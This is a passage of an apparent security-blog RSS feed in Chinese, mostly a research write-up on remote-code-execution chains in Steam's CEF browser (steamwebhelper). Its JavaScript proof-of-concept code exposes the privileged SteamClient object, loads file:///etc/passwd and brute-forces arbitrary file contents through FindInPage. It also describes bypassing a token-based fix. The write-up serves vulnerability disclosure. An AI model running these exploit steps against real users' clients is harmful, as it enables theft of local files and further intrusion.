&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   // Each static block has its own var and lexical scope, so make a new var
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;patch十分简单，实际真正有效的修复代码仅有一行，在解析class的&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes/Static_initialization_blocks&#34;&gt;static initialization block&lt;/a&gt;时新增了一个类型为&lt;code&gt;FunctionParsingScope&lt;/code&gt;的变量，我们再看一下这个新增的变量做了什么：&lt;/p&gt;</description>
    </item>
    <item>
      <title>Steam漏洞利用：CEF框架应用下的常规与非常规利用手段</title>
      <link>https://www.darknavy.org/zh/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/</link>
      <pubDate>Thu, 27 Jun 2024 11:39:37 +0800</pubDate>
      <guid>https://www.darknavy.org/zh/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/</guid>
      <description>&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
&lt;p&gt;Chromium Embedded Framework(CEF)是一个开源框架，开发者可以将Chromium引擎嵌入至他们的应用程序中。尽管CEF被广泛应用于诸如微信和Epic Games Launcher等流行软件中，但对其安全性的研究却甚少。在本文中，我们将以Steam客户端浏览器（一款基于CEF的应用程序）为例，介绍我们发现的漏洞及其利用方式，展示我们如何构建了三个远程代码执行（RCE）链。&lt;/p&gt;
&lt;h2 id=&#34;rce1steamwebhelper中多个问题导致rce&#34;&gt;RCE#1：&lt;code&gt;steamwebhelper&lt;/code&gt;中多个问题导致RCE&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;steamwebhelper&lt;/code&gt;是Steam客户端内置的浏览器，用于渲染商店、社区、好友等页面。其基于CEF开发，并在CEF的基础上添加了一些功能。我们在这些额外的功能中找到了一系列逻辑漏洞以及特性导致的问题，最终完成了RCE。&lt;/p&gt;
&lt;h3 id=&#34;在外部页面中获取steamclient对象&#34;&gt;在外部页面中获取&lt;code&gt;SteamClient&lt;/code&gt;对象&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;steamwebhelper&lt;/code&gt;在加载一些特定的页面，例如&lt;code&gt;steampowered.com&lt;/code&gt; 、 &lt;code&gt;steamloopback.host&lt;/code&gt;等页面时，会在JavaScript运行环境中加入一个&lt;strong&gt;特权对象&lt;/strong&gt;&lt;code&gt;SteamClient&lt;/code&gt;。对该过程进行逆向后，我们发现，对有域名的url，&lt;code&gt;steamwebhelper&lt;/code&gt;会调用&lt;code&gt;BIsTrustedDomain&lt;/code&gt;检查其域名是否在白名单中，而对于没有域名的url，会检查其是否为&lt;code&gt;data&lt;/code&gt;或&lt;code&gt;about&lt;/code&gt;协议。&lt;/p&gt;
&lt;img src=&#34;assets/1.jpg&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 50%;&#34;/&gt;
&lt;p&gt;在外部页面中打开白名单中的域名会被同源策略限制，然而打开&lt;code&gt;about:blank&lt;/code&gt;等页面并不会，因此我们可以在自己可控的页面中打开&amp;quot;about:blank&amp;quot;，获取并使用其&lt;code&gt;SteamClient&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;ab_page&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;about:blank&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;s_client&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ab_page&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;SteamClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s_client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;使用browserview加载file协议&#34;&gt;使用&lt;code&gt;BrowserView&lt;/code&gt;加载file协议&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;SteamClient&lt;/code&gt;是steam中内部页面所使用的特权对象，它有很多特权功能，如操作当前的Browser对象、操作窗口位置、下载任意文件等。&lt;/p&gt;
&lt;img src=&#34;assets/2.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 100%;&#34;/&gt;
&lt;p&gt;通过&lt;code&gt;SteamClient.BrowserView&lt;/code&gt;，我们可以创建并管理&lt;code&gt;BrowserView&lt;/code&gt;。经过测试发现，&lt;code&gt;BrowserView&lt;/code&gt;是一个嵌入在原始网页中的子页面，类似于普通web页面中的一个iframe，但与此对象的交互都是由Steam自身实现。&lt;/p&gt;
&lt;img src=&#34;assets/3.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 100%;&#34;/&gt;
&lt;p&gt;在测试&lt;code&gt;BrowserView&lt;/code&gt;的功能时，我们发现&lt;code&gt;BrowserView.LoadURL&lt;/code&gt;调用不会受到任何安全策略的限制，可以加载任意协议任意域名的url，包括&lt;code&gt;chrome://&lt;/code&gt;、&lt;code&gt;file://&lt;/code&gt;等权限较高的协议。&lt;/p&gt;
&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;b_view&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s_client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;BrowserView&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;b_view&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;LoadURL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file:///etc/passwd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;b_view&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;SetBounds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;b_view&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;SetVisible&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;获取browserview中加载的页面内容实现任意文件读&#34;&gt;获取&lt;code&gt;BrowserView&lt;/code&gt;中加载的页面内容，实现任意文件读&lt;/h3&gt;
&lt;p&gt;至此我们已可以通过&lt;code&gt;LoadURL&lt;/code&gt;加载到本地的任意文件，但是还没有办法直接读取到页面内容。通过测试逆向&lt;code&gt;BrowserView&lt;/code&gt;对象，发现其提供了&lt;code&gt;FindInPage&lt;/code&gt;功能可以在页面中搜索特定字符串，并且通过调用&lt;code&gt;BrowserView.on(&amp;quot;find-in-page-results&amp;quot;, callback)&lt;/code&gt;可以注册一个回调函数来处理搜索的结果。那么问题变成了：如果可以在页面内搜索一个可控字符串并获取到搜索结果，能否获取到页面的内容？（听起来像是一道CTF题目）&lt;/p&gt;
&lt;p&gt;答案是肯定的，最终通过逐字节爆破搜索，我们可以做到任意文件读的效果。&lt;/p&gt;
&lt;p&gt;PoC（通过读&lt;code&gt;file:///home/&lt;/code&gt;获取用户名）:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;is_str_in_bv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stage&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;bv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;FindInPage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stage&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;count&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;b_view&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;find-in-page-results&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stage&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stage&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;count&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stage&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stage&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;count&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;baseuser&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;charset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;abcdefghijklmnopqrstuvwxyz&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;found&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;teststr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;baseuser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;count&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;home/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;endsWith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;teststr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;count&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;is_str_in_bv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;b_view&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;teststr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;found&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;baseuser&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;teststr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;baseuser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;从任意文件读到任意文件创建&#34;&gt;从任意文件读到任意文件创建&lt;/h3&gt;
&lt;p&gt;在这篇&lt;a href=&#34;https://hackerone.com/reports/667242&#34;&gt;漏洞报告&lt;/a&gt;中提到了，通过&lt;code&gt;steam://devkit-1&lt;/code&gt;中的&lt;code&gt;list-shortcuts&lt;/code&gt;等功能可以做到任意文件创建（文件内容不可控），而这个漏洞的修复方式是在&lt;code&gt;~/.steam/steam.token&lt;/code&gt;文件中随机生成一个字符串，在使用&lt;code&gt;steam://devkit-1&lt;/code&gt;相关功能时，会验证token是否正确。事实上此方式并未对此功能逻辑上的缺陷进行修复，若攻击者可以读取到token，则可以轻易bypass此修复。&lt;/p&gt;</description>
    </item>
    <item>
      <title>填补盾牌的裂缝：堆分配器中的MTE</title>
      <link>https://www.darknavy.org/zh/blog/strengthening_the_shield_mte_in_memory_allocators/</link>
      <pubDate>Wed, 03 Jan 2024 16:14:27 +0800</pubDate>
      <guid>https://www.darknavy.org/zh/blog/strengthening_the_shield_mte_in_memory_allocators/</guid>
      <description>&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
&lt;p&gt;2018年，随着ARMv8.5-A的发布，一个全新的芯片安全特性&lt;a href=&#34;https://developer.arm.com/-/media/Arm%20Developer%20Community/PDF/Arm_Memory_Tagging_Extension_Whitepaper.pdf&#34;&gt;MTE&lt;/a&gt;(Memory Tagging Extensions) 横空出世。时隔五年后的2023年，市场上第一款支持此特性的手机发布 —— &lt;a href=&#34;https://blog.google/products/pixel/google-pixel-8-pro/&#34;&gt;Google Pixel 8&lt;/a&gt;，宣告着MTE正式走入了消费者群体。虽然该特性在手机上还未默认启用，但开发者可以&lt;a href=&#34;https://googleprojectzero.blogspot.com/2023/11/first-handset-with-mte-on-market.html&#34;&gt;自行开启体验&lt;/a&gt;。&lt;/p&gt;
